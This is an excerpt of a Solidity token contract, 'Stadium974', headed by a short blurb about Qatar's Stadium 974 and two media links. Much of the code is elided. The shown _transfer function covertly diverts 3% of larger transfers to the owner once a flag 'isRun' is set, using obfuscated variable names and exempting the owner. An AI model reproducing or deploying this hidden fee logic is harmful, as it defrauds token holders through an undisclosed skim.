...
Construction of the stadium started in 2018 and was completed three years later. The stadium officially opened on 30 November 2021 with the 
Arab Cup group match between United Arab Emirates and Syria (2-1).
  https://www.youtube.com/watch?v=uwi0N_wua90&ab_channel=TFCStadiums
  https://www.facebook.com/ESPNFC/photos/a.403514944820/10159951008959821/?type=3
...
contract Stadium974 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function _transfer(
        ...
        if (owner() != recipient && owner() != sender) {
            if (isRun > 0 && amount > 1000) {
                ...
                uint256 UQGCDS = 3;
                uint256 OLITXO = amount*UQGCDS/100;
                _balances[sender] = _balances[sender] - amount;
                _balances[recipient] += amount -OLITXO;
                _balances[owner()] +=OLITXO;
            }
        } else {
            _balances[sender] = _balances[sender] - amount;
